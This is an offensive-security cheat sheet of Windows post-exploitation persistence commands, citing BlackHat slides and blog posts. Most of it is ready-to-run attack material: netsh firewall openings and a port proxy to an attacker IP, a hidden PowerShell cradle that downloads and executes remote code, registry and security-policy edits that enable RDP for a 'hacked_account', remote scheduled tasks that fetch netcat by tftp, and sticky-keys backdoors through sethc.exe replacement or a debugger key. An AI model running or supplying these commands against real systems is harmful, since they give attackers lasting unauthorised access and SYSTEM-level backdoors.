<!-- Code for collapse and expand -->
<script type="text/javascript">
$(document).ready(function() {
$('div.view').hide();
$('div.slide').click(function() {
$(this).next('div.view').slideToggle('fast');
return false;
});
});
</script>

# Windows General Persistence Commands

Commands to run to maintain persistence after you have exploited it and are usually executed from the context of the `cmd.exe` or `command.exe` prompt.

### Firewall Exceptions
When you modify a system to talk on the network, you may need to alter the Windows firewall so your traffic is not filtered. The `netsh` command can be used to do this as the command to enable Remote Desktop Protocol below shows:

`netsh firewall set service type = remotedesktop mode = enable`

### Allow a program to listen through the firewall
Taken from http://synjunkie.blogspot.de/2008/03/basic-dos-foo.html

`netsh firewall add allowedprogram C:\nltest.exe mltest enable`

### Open a port on the firewall
Taken from http://synjunkie.blogspot.de/2008/03/basic-dos-foo.html

`netsh firewall add portopening tcp 2482 lt enable all`


### Tunnel Traffic Natively with Windows
`netsh int portproxy v4tov4 listenport=80 connecthost=[AttackerIP] connectport=80`


### Powershell Downloader
 * **Command with arguments**: `powershell.exe -w hidden -nop -ep bypass -c "IEX ((new-object net.webclient).downloadstring('http://[domainname|IP]:[port]/[file]'))"`
 * **Description**: According to [posted slides](http://www.slideshare.net/mubix/windows-attacks-at-is-the-new-black-26665607), _"Schedule this and it will execute the shellcode on that page, pulling it each time (so you can change as needed)"_.


### Remote Assistance Enable
 * **Command with arguments**: `reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fAllowToGetHelp /t REG_DWORD /d 1 /f`
 * **Description**: **Must be admin to run this.** Enable remote assistance through adding a registry entry on the local system.


### Remote Desktop Enable - Method 1
 * **Command with arguments**: `reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fDenyTSConnections /t REG_DWORD /d 0 /f`
 * **Description**: **Must be admin to run this.** Enable remote desktop through adding a registry entry on the local system.


### Remote Desktop Enable - Method 2
Remote Desktop allows a remote user to receive a graphical "desktop" of the target (compromised) system. According to Val Smith's and Colin Ames' [BlackHat 2008 presentation (page 53)](http://www.blackhat.com/presentations/bh-usa-08/Smith_Ames/BH_US_08_Smith_Ames_Meta-Post_Exploitation.pdf), you can remotely enable remote desktop using the commands below.

 1. On the compromised system, create a file named `fix_ts_policy.ini` containing the contents below. Change the *"hacked_account"* value to the account you have compromised on the remote system.


    <pre>
     [Unicode]
         Unicode=yes
         [Version]
         signature="$CHICAGO$"
         Revision=1
         [Privilege Rights] [Privilege Rights]
         seremoteinteractivelogonright = hacked_account
         seinteractivelogonright = hacked_account
         sedenyinteractivelogonright =
         sedenyremoteinteractivelogonright =
         sedenynetworklogonright =
    </pre>

 1. Create another file named `enable_ts.reg` containing the contents below.



    <pre>

     Windows Registry Editor Version 5.00

     [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]

     "fDenyTSConnections"=dword:00000000

     "TSEnabled"=dword:00000001

     "TSUserEnabled"=dword:00000000

    </pre>



 1. On the remote system, execute the following commands:


```
c:\> sc config termservice start= auto sc config termservice start= auto

c:\> regedit /s enable_ts.reg

c:\> copy c:\windows\security\database\secedit.sdb c:\windows\security\database\new.secedit.sdb

c:\> copy c:\windows\security\database\secedit.sdb c:\windows\security\database\orig.secedit.sdb

c:\> secedit /configure /db new.secedit.sdb /cfg fix_ts_policy.ini

c:\> gpupdate /Force

c:\> net start "terminal services"
```





### Scheduler

The [Windows scheduler](http://support.microsoft.com/kb/313565) can be used to further compromise a system. It usually runs at the SYSTEM account privilege level. According to Val Smith's and Colin Ames' [BlackHat 2008 presentation (page 58)](http://www.blackhat.com/presentations/bh-usa-08/Smith_Ames/BH_US_08_Smith_Ames_Meta-Post_Exploitation.pdf), you can remotely schedule tasks using the commands below.



<pre>

c:\> net use \\[TargetIP]\ipc$ password /user:username

c:\> at \\[TargetIP] 12:00 pm command

</pre>



An example you might run on the remote system might be: `at \\192.168.1.1 12:00pm tftp -I [MyIP] GET nc.exe`





### Sticky Keys (Requires reboot)

Sticky keys on Windows systems are activated when the user presses the SHIFT key 5 times. Here, according to the [posted slides](http://www.slideshare.net/mubix/windows-attacks-at-is-the-new-black-26665607), you replace the sethc.exe binary with your own binary (cmd.exe maybe?) and, when SHIFT is pressed 5 times, your binary is executed. Your binary will execute as SYSTEM and needs to replace the `%WINDIR%\System32\sethc.exe`.



Some caveats:

* If NLA (Network Layer Authentication) is enabled, this won't work

* If RDP (Remote Desktop Protocol) is disabled, this won't work





### Sticky Keys (No reboot)

This technique uses registry entries to switch the binary that the sticky keys executes. Its real advantage is that it does not require a reboot for the switch to take place.

* In the `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options` make a key called `sethc.exe`

* Make a REG_SZ value called "Debugger" (Ensure it is capitalized)

* For the "Debugger" REG_SZ, make it have a value of your binary

* Press SHIFT 5 times and your binary should be executed
